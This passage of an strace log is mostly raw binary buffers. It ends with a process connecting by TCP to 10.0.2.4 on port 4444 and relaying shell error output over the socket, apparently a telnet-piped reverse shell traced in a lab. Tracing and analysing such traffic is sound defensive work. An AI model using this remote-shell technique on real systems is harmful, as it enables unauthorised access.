\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\306\265\363\267\264e\365\267+\226\310\267\304\331\207\277\211\222\364\267+\226\310\267\270\265\363\267\364_\365\267\240b\365\267\0\0\0\0T\334\207\277\220)\364\267!\226\310\267R\323\335\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0+\226\310\267\0\0\0\0 `\365\267\0\0\0\0\0\0\0\0\210\305\340\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0R\323\335\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\306\265\363\267\264e\365\267r\361\311\267P\332\207\277\211\222\364\267r\361\311\267\270\265\363\267\364_\365\267\240b\365\267\0\0\0\0\340\334\207\277\220)\364\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0r\361\311\267\0\0\0\0 `\365\267\0\0\0\0\0\0\0\0\340\302\340\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\340\332\207\277\370\332\207\277|\300\310\267\240\334\207\277\235\30\364\267L\300\310\267F\305\340\2670\305\340\267H\323\335\267\330\332\207\277\211\222\364\267H\323\335\267<\305\340\267\364_\365\267\340\302\340\267\270\315\335\267h\335\207\277\220)\364\267H\323\335\267R\323\335\267\374\34\0\0\374\34\0\0\0\0\0\0\5\0\0\0H\323\335\267\0@\0\0 `\365\267|0\0\0\0\0\0\0008\300\340\267\210\305\340\267(\333\207\277\365\361\364\267\10\0\0\0h\305\340\267R\323\335\267t\333\207\277\237Q\364\267F\305\340\2670\305\340\267\235\236\336\267X\333\207\277\211\222\364\267\235\236\336\267<\305\340\267\364_\365\267\340\302\340\267\270\315\335\267\350\335\207\277\220)\364\267\235\236\336\267R\323\335\267\364_\365\267\20\333\207\277\210\305\340\267\240\334\207\277\235\236\336\267\7\0\0\0 `\365\267\0\0\0\0\0\0\0\0\230\235\363\267\0\0\0\0\250\333\207\277\365\361\364\267\10\0\0\0\364_\365\267R\323\335\267\340\302\340\267\300\333\207\277\365\361\364\267`\270\363\267\10\0\0\0 `\365\267\340\332\207\277\24\335\207\277\7\0\0\0\351S\360\267\306\265\363\267\264e\365\267<_\344\267\370\333\207\277\211\222\364\267<_\344\267\270\265\363\267\364_\365\267\240b\365\267\0\0\0\0\210\336\207\277\220)\364\267\26_\344\267R\323\335\267\2\0\0\0008\335\207\0L\300\310\267|\300\310\267<_\344\267|0\0\0 `\365\267\0\376\0\0\0\0\0\0\360\232\363\267}\246\4\0\244\201\0\0\1\0\0\0\0\0\0\0\0\0\0\0R\323\335\267\364_\365\2678\342\207\277\0\0\0\0\200\334\207\277Gl\364\267\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0+\226\310\267\0\0\0\0\1\0\0\0\0\0\0\0\340\276\310\267`\335\207\277\6\206\364\2678\342\207\277\0\0\0\0\v\v\364\267\364_\365\267[\342\207\277T\342\207\277P\342\207\277\300e\365\267h\305\340\267P\230\363\267\0\0\0\0\0\0\0\0\364_\365\267\360k\364\267\340\276\310\267`\335\207\277\210\334\207\277\351\205\364\267\0\0\0\0\364_\365\2678\342\207\277\0\0\0\0\f\335\207\277Gl\364\267\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0r\361\311\267\0\0\0\0\1\0\0\0\0\0\0\0\244}\335\267\354\335\207\277\6\206\364\2678\342\207\277\0\0\0\0\1\1\1\0\0\0\0\0\301\360\364\267T\342\207\277P\342\207\277\300e\365\2674\0\0\0L!\0\0\0\0\0\0\364_\365\267\0\0\0\0\2\0\0\0`\335\207\277\365\361\364\267\10\0\0\0\344\310\340\267\340\302\340\267h\342\207\277yv\364\267\350\310\340\267\344\310\340\267\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\340\302\340\267\240b\365\267\0\0\0\0\0\0\0\0\34`\336\267t\336\207\277\6\206\364\2678\342\207\277\0\0\0\0\5\0\0\0\0\20\0\0[\342\207\277\301\360\364\267P\342\207\277\300e\365\267\230\1\0\0\310\1\0\0\0\0\0\0\0\20\0\0\364_\365\267\2\0\0\0l~\335\267\354\335\207\277\365\361\364\267\10\0\0\0\244\310\340\267\230\310\340\267h\342\207\277\346n\364\267\244\310\340\267\230\310\340\267\10\0\0\0\235\236\336\267\0\0\0\0\1\0\0\0\0\0\0\0\240b\365\267\0\0\0\0\6\206\364\2678\342\207\277\0\0\0\0\6\0\0\0\4\0\0\0[\342\207\277T\342\207\277P\342\207\277\301\360\364\267@\1\0\0@\1\0\0\0\0\0\0\1\0\0\0\364_\365\267\360k\364\267\364_\365\267\2\0\0\0\324`\336\267t\336\207\277\365\361\364\267\10\0\0\0\214\310\340\267\200\310\340\267h\342\207\277\346n\364\267\214\310\340\267\200\310\340\267\10\0\0\0\264\336\207\277Gl\364\267\340\302\340\267\0\0\0\0\0\0\0\0\0\0\0\0<_\344\267\0\0\0\0\1\0\0\0\0\0\0\0\300\336\207\277\0\0\0\0\364\177\335\267\2460\321\267|\337\207\277\317`\330\267\0\0\0\0\313<\364\267", 4096}], msg_controllen=0, msg_flags=0}, 0) = 128
+29848 15:04:56.663696 recvmsg(7, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"\24\0\0\0\3\0\2\0X\331%Y\230t\0\0\0\0\0\0\1\0\0\0\24\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\24\0\6\0\377\377\377\377\377\377\377\377V\2\0\0V\2\0\0@\0\0\0\24\0\2\0X\331%Y\230t\0\0\n@\200\375\2\0\0\0\24\0\1\0\376\200\0\0\0\0\0\0\n\0\'\377\376F\331J\24\0\6\0\377\377\377\377\377\377\377\377V\2\0\0V\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\306\265\363\267\264e\365\267+\226\310\267\304\331\207\277\211\222\364\267+\226\310\267\270\265\363\267\364_\365\267\240b\365\267\0\0\0\0T\334\207\277\220)\364\267!\226\310\267R\323\335\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0+\226\310\267\0\0\0\0 `\365\267\0\0\0\0\0\0\0\0\210\305\340\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0R\323\335\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\306\265\363\267\264e\365\267r\361\311\267P\332\207\277\211\222\364\267r\361\311\267\270\265\363\267\364_\365\267\240b\365\267\0\0\0\0\340\334\207\277\220)\364\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0r\361\311\267\0\0\0\0 `\365\267\0\0\0\0\0\0\0\0\340\302\340\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\340\332\207\277\370\332\207\277|\300\310\267\240\334\207\277\235\30\364\267L\300\310\267F\305\340\2670\305\340\267H\323\335\267\330\332\207\277\211\222\364\267H\323\335\267<\305\340\267\364_\365\267\340\302\340\267\270\315\335\267h\335\207\277\220)\364\267H\323\335\267R\323\335\267\374\34\0\0\374\34\0\0\0\0\0\0\5\0\0\0H\323\335\267\0@\0\0 `\365\267|0\0\0\0\0\0\0008\300\340\267\210\305\340\267(\333\207\277\365\361\364\267\10\0\0\0h\305\340\267R\323\335\267t\333\207\277\237Q\364\267F\305\340\2670\305\340\267\235\236\336\267X\333\207\277\211\222\364\267\235\236\336\267<\305\340\267\364_\365\267\340\302\340\267\270\315\335\267\350\335\207\277\220)\364\267\235\236\336\267R\323\335\267\364_\365\267\20\333\207\277\210\305\340\267\240\334\207\277\235\236\336\267\7\0\0\0 `\365\267\0\0\0\0\0\0\0\0\230\235\363\267\0\0\0\0\250\333\207\277\365\361\364\267\10\0\0\0\364_\365\267R\323\335\267\340\302\340\267\300\333\207\277\365\361\364\267`\270\363\267\10\0\0\0 `\365\267\340\332\207\277\24\335\207\277\7\0\0\0\351S\360\267\306\265\363\267\264e\365\267<_\344\267\370\333\207\277\211\222\364\267<_\344\267\270\265\363\267\364_\365\267\240b\365\267\0\0\0\0\210\336\207\277\220)\364\267\26_\344\267R\323\335\267\2\0\0\0008\335\207\0L\300\310\267|\300\310\267<_\344\267|0\0\0 `\365\267\0\376\0\0\0\0\0\0\360\232\363\267}\246\4\0\244\201\0\0\1\0\0\0\0\0\0\0\0\0\0\0R\323\335\267\364_\365\2678\342\207\277\0\0\0\0\200\334\207\277Gl\364\267\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0+\226\310\267\0\0\0\0\1\0\0\0\0\0\0\0\340\276\310\267`\335\207\277\6\206\364\2678\342\207\277\0\0\0\0\v\v\364\267\364_\365\267[\342\207\277T\342\207\277P\342\207\277\300e\365\267h\305\340\267P\230\363\267\0\0\0\0\0\0\0\0\364_\365\267\360k\364\267\340\276\310\267`\335\207\277\210\334\207\277\351\205\364\267\0\0\0\0\364_\365\2678\342\207\277\0\0\0\0\f\335\207\277Gl\364\267\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0r\361\311\267\0\0\0\0\1\0\0\0\0\0\0\0\244}\335\267\354\335\207\277\6\206\364\2678\342\207\277\0\0\0\0\1\1\1\0\0\0\0\0\301\360\364\267T\342\207\277P\342\207\277\300e\365\2674\0\0\0L!\0\0\0\0\0\0\364_\365\267\0\0\0\0\2\0\0\0`\335\207\277\365\361\364\267\10\0\0\0\344\310\340\267\340\302\340\267h\342\207\277yv\364\267\350\310\340\267\344\310\340\267\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\340\302\340\267\240b\365\267\0\0\0\0\0\0\0\0\34`\336\267t\336\207\277\6\206\364\2678\342\207\277\0\0\0\0\5\0\0\0\0\20\0\0[\342\207\277\301\360\364\267P\342\207\277\300e\365\267\230\1\0\0\310\1\0\0\0\0\0\0\0\20\0\0\364_\365\267\2\0\0\0l~\335\267\354\335\207\277\365\361\364\267\10\0\0\0\244\310\340\267\230\310\340\267h\342\207\277\346n\364\267\244\310\340\267\230\310\340\267\10\0\0\0\235\236\336\267\0\0\0\0\1\0\0\0\0\0\0\0\240b\365\267\0\0\0\0\6\206\364\2678\342\207\277\0\0\0\0\6\0\0\0\4\0\0\0[\342\207\277T\342\207\277P\342\207\277\301\360\364\267@\1\0\0@\1\0\0\0\0\0\0\1\0\0\0\364_\365\267\360k\364\267\364_\365\267\2\0\0\0\324`\336\267t\336\207\277\365\361\364\267\10\0\0\0\214\310\340\267\200\310\340\267h\342\207\277\346n\364\267\214\310\340\267\200\310\340\267\10\0\0\0\264\336\207\277Gl\364\267\340\302\340\267\0\0\0\0\0\0\0\0\0\0\0\0<_\344\267\0\0\0\0\1\0\0\0\0\0\0\0\300\336\207\277\0\0\0\0\364\177\335\267\2460\321\267|\337\207\277\317`\330\267\0\0\0\0\313<\364\267", 4096}], msg_controllen=0, msg_flags=0}, 0) = 20
+29848 15:04:56.664387 close(7)          = 0
+29848 15:04:56.664417 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
+29848 15:04:56.664435 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf87d908) = -1 ENOTTY (Inappropriate ioctl for device)
+29848 15:04:56.664448 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f37000
+29848 15:04:56.664463 close(-1)         = -1 EBADF (Bad file descriptor)
+29848 15:04:56.664475 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 7
+29848 15:04:56.664489 setsockopt(7, SOL_IP, IP_TOS, [16], 4) = 0
+29848 15:04:56.664502 connect(7, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("10.0.2.4")}, 16 <unfinished ...>
+29846 15:04:56.664630 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+29846 15:04:56.664650 --- SIGCHLD (Child exited) @ 0 (0) ---
+29846 15:04:56.664678 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 29847
+29846 15:04:56.664699 waitpid(-1, 0xbfced2e8, WNOHANG) = -1 ECHILD (No child processes)
+29846 15:04:56.664715 sigreturn()       = ? (mask now [])
+29848 15:04:56.664797 <... connect resumed> ) = 0
+29848 15:04:56.664810 open("/etc/telnetrc", O_RDONLY) = -1 ENOENT (No such file or directory)
+29848 15:04:56.664863 open("(null)/.telnetrc", O_RDONLY) = -1 ENOENT (No such file or directory)
+29848 15:04:56.664880 write(1, "Trying 10.0.2.4...\nConnected to 10.0.2.4.\nEscape character is \'^]\'.\n", 68) = 68
+29848 15:04:56.664895 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29848 15:04:56.664907 rt_sigaction(SIGINT, {0x804f550, [INT], SA_RESTART}, {SIG_IGN}, 8) = 0
+29848 15:04:56.664921 rt_sigaction(SIGQUIT, {0x804f500, [QUIT], SA_RESTART}, {SIG_IGN}, 8) = 0
+29848 15:04:56.664935 rt_sigaction(SIGWINCH, {0x804f4e0, [WINCH], SA_RESTART}, {SIG_IGN}, 8) = 0
+29848 15:04:56.664949 rt_sigaction(SIGTSTP, {0x8053270, [TSTP], SA_RESTART}, {0x8053270, [TSTP], SA_RESTART}, 8) = 0
+29848 15:04:56.664964 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf87dfe4) = -1 EINVAL (Invalid argument)
+29848 15:04:56.664976 ioctl(0, SNDCTL_TMR_STOP or TCSETSW, {B0 opost isig icanon echo ...}) = -1 EINVAL (Invalid argument)
+29848 15:04:56.664989 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf87dfe4) = -1 EINVAL (Invalid argument)
+29848 15:04:56.664999 ioctl(0, SNDCTL_TMR_START or TCSETS, {B0 opost isig icanon echo ...}) = -1 EINVAL (Invalid argument)
+29848 15:04:56.665094 ioctl(0, FIONBIO, [1]) = 0
+29848 15:04:56.665108 ioctl(1, FIONBIO, [1]) = 0
+29848 15:04:56.665118 ioctl(7, FIONBIO, [1]) = 0
+29848 15:04:56.665130 setsockopt(7, SOL_SOCKET, SO_OOBINLINE, [1], 4) = 0
+29848 15:04:56.665144 select(8, [0 7], [], [7], {0, 0}) = 1 (in [0], left {0, 0})
+29848 15:04:56.665175 read(0, "sh: line 1: Trying: command not found\n", 8191) = 38
+29848 15:04:56.665190 select(8, [0 7], [7], [7], {0, 0}) = 1 (out [7], left {0, 0})
+29848 15:04:56.665207 send(7, "sh: line 1: Trying: command not found\r\n", 39, 0) = 39
+29848 15:04:56.665270 select(8, [0 7], [], [7], {0, 0}) = 0 (Timeout)
+29848 15:04:56.665298 select(8, [0 7], [], [7], NULL <unfinished ...>
+29842 15:04:56.665333 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
+29842 15:04:56.665383 close(1)          = 0
+29842 15:04:56.665401 rt_sigprocmask(SIG_BLOCK, [CHLD], [CHLD], 8) = 0
+29842 15:04:56.665436 rt_sigprocmask(SIG_BLOCK, [CHLD], [CHLD], 8) = 0
